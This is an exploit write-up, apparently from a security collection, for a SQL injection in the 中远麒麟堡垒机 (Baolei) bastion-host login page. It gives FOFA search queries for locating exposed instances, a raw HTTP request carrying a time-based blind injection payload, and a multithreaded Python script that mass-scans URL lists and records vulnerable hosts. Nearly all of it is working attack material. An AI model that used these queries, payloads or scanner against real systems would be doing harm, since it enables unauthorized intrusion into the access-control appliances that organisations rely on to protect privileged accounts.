fofa

```markdown
cert="Baolei"
cert=“宝雷”
title="宝雷主机”
body=“admin.php？控制器=admin_index操作=get_user_login_fristauth”
body=“admin.php？控制器=admin_index操作=登录”
```

pay

```markdown
POST /admin.php?controller=admin_commonuser HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Content-Length: 78
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm
```

poc

```python
import requests, json, time, sys, argparse
from urllib3.exceptions import InsecureRequestWarning
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def poc(target):
    payload = "/admin.php?controller=admin_commonuser"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"

    try:
        res = requests.get(url=target + payload, headers=headers, verify=False)
        if res.status_code == 200 and "username and password" in res.text:
            res1 = requests.post(url=target + payload, data=data, headers=headers, verify=False)
            res2 = requests.post(url=target, headers=headers, verify=False)
            time1 = res1.elapsed.total_seconds()  # 响应的时间
            time2 = res2.elapsed.total_seconds()
            if time1 - time2 >= 5:
                print(f"[+] {target} 存在SQL注入漏洞")
                with open('result4.txt', "a", encoding='utf-8') as f:
                    f.write(f"[+] {target} 存在SQL注入漏洞\n")
            else:
                print(f"[-] {target} 不存在SQL注入漏洞")
                # with open('result4.txt', "a", encoding='utf-8') as f:
                #     f.write(f"[-] {target} 不存在SQL注入漏洞\n")
        else:
            print(f"[-] {target} 不存在SQL注入漏洞")
    except Exception as e:
        print(f"[-] {target} 连接超时或其他错误: {e}")

def main():
    parser = argparse.ArgumentParser(description="中远麒麟堡垒机SQL注入检测工具")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()
```

